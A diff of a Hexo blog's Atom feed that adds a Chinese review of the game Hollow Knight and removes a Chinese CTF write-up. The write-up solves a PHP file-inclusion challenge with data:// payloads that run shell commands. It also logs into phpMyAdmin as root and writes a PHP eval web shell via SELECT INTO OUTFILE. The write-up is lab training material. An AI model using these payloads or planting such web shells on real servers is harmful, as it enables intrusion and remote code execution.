@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-02-20T17:52:00.188Z</updated>
+  <updated>2023-02-24T03:02:16.729Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>《空洞骑士》：一场探索未知迷宫的沉浸式体验</title>
+    <link href="http://example.com/2023/02/24/hollow_knight/"/>
+    <id>http://example.com/2023/02/24/hollow_knight/</id>
+    <published>2023-02-23T16:00:00.000Z</published>
+    <updated>2023-02-24T03:02:16.729Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/Hollow_Knight_1.jpg" alt="Hollow Knight"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初玩时不觉得，越玩越有味道。<br>空洞骑士真乃神作也。</p><h1 id="逐渐深入的乐趣：空洞骑士的游戏设计"><a href="#逐渐深入的乐趣：空洞骑士的游戏设计" class="headerlink" title="逐渐深入的乐趣：空洞骑士的游戏设计"></a>逐渐深入的乐趣：空洞骑士的游戏设计</h1><p>起初玩空洞骑士，感觉只是一款单一的游戏。一开始没有疾跑，只有走，回血，攻击。可谓是让人感觉略显单薄。<br>由于这款游戏在steam上好评率非常高，并且许多人把它称之为神作，再加上看过一些游戏片段，知道后面会变得丰富后，我耐着性子玩了下去。<br>初期阶段的我什么都不懂，只知道打怪，东走走西走走，因为不知道自己要达成什么目标，所以显得如无头苍蝇般无所适从。于是看了看攻略视频。<br>之后，慢慢地，有了冲刺，有了爬墙，有了冲击波……我感觉操作丰富了起来。我也不再需要攻略，摸索地图有了自己的路线，打怪走路有了自己的节奏，甚至有了自己刷金币的方式。一点一点充实背包，一点一点扩大地图，探索未知的好奇，让我心情愉悦。</p><h1 id="享受迷宫探索：手残党的空洞骑士游戏体验"><a href="#享受迷宫探索：手残党的空洞骑士游戏体验" class="headerlink" title="享受迷宫探索：手残党的空洞骑士游戏体验"></a>享受迷宫探索：手残党的空洞骑士游戏体验</h1><p>我自己算是手残党吧，能为了过一个地方花上一小时，为了打败一个boss死好多次。因此同等情形下游玩时间也比别人多，不过我并不在意，我享受这个过程。我就像是真正处于一个未知幽深的迷宫中，带着好奇心与勇气，谨慎却不失大胆。会提心吊胆地走在未知领域，也会为了丢失一千多吉欧而懊恼不已，会为了打败boss而兴奋不已，也会为了强敌而选择逃离。这是一个享受的过程。</p><h1 id="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"><a href="#攻略指引启蒙：游戏探索中攻略和沉浸的平衡" class="headerlink" title="攻略指引启蒙：游戏探索中攻略和沉浸的平衡"></a>攻略指引启蒙：游戏探索中攻略和沉浸的平衡</h1><p>没搞清楚游戏的玩法前，可以看看攻略启发游玩方式。毕竟有时不看攻略某些操作是真不知道怎么做（比如下劈能往上弹）。弄清楚游戏的玩法后，就完全没必要看攻略了（除非卡关）。沉浸式体验其中，那才是最重要的。</p><h1 id="完美融合：空洞骑士的艺术设计与游戏机制"><a href="#完美融合：空洞骑士的艺术设计与游戏机制" class="headerlink" title="完美融合：空洞骑士的艺术设计与游戏机制"></a>完美融合：空洞骑士的艺术设计与游戏机制</h1><p>以上说的还是玩法的部分，其游戏的美术画面音乐部分也是非常具有风格，操作按键之类也非常流畅自然。甚至隐隐有只狼那种拼刀的感觉。而这，仅仅是2017年发布的一款2D类动作冒险游戏。<br>这款游戏无愧于神作！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看steam评论区游玩时长大多是60h以上，甚至不乏二百小时的，而我目前才十多小时，看来距离通关还有很久…<br>听说第二部《丝之歌》快要出来了，非常期待~</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Hollow_Knight_1.jpg&quot; alt=&quot;Hollow Knight&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="game" scheme="http://example.com/categories/game/"/>
+    
+    
+    <category term="game" scheme="http://example.com/tags/game/"/>
+    
+    <category term="recommend" scheme="http://example.com/tags/recommend/"/>
+    
+  </entry>
   
   <entry>
     <title>谁最可靠</title>
@@ -476,31 +499,6 @@
     <category term="CTF" scheme="http://example.com/tags/CTF/"/>
     
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>攻防世界-Web_php_include</title>
-    <link href="http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/"/>
-    <id>http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/</id>
-    <published>2022-12-23T16:00:00.000Z</published>
-    <updated>2022-12-24T09:18:43.990Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础题，多种解法。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>strstr()函数<br>查找字符串的首次出现<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strstr(string $haystack, string $needle, bool $before_needle = false): string|fal</span><br><span class="line">返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。</span><br><span class="line">注意:</span><br><span class="line">该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</span><br></pre></td></tr></table></figure></li></ul><p>根据源码可知，我们可以传入两个参数hello,page<br>并且过滤了 <code>php://</code><br>虽然函数定义上区分大小写，但本关中使用大小写绕过并不能成功，于是我们可以换成data:</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure></li></ol><ul><li>system()函数<br>执行外部程序，并且显示输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(string $command, int &amp;$result_code = null): string|false</span><br><span class="line">同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。</span><br><span class="line"></span><br><span class="line">如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</span><br><span class="line"></span><br><span class="line">如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</span><br></pre></td></tr></table></figure></li><li>ls命令<br>ls命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</li></ul><p>因此该payload可以得到我们所需的文件：fl4gisisish3r3.php<br>之后再次构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>由此，可以在源码中拿到flag</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过扫描后台工具发现phpmyadmin后台<br>打开该后台,进入登录页面：<br><code>http://61.147.171.105:49265/phpmyadmin</code><br>username:root, password为空<br>之后进入SQL语句输入的地方，编辑一句话木马并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/tmp/123.php&#x27;</span><br></pre></td></tr></table></figure><p>使用 SELECT … INTO OUTFILE 语句导出数据到相应文件中。<br>打开蚁剑，url地址输入：<br><code>http://61.147.171.105:49265/?page=/tmp/123.php</code><br>密码为cmd<br>连接成功后，在www目录下找到fl4gisisish3r3.php<br>打开拿到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有些方法可以使用，这里不再列举，可以看看攻防世界的wp。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;基础题，多种解法。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
-    
-    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-    
-    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
-    
-    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
   </entry>
   
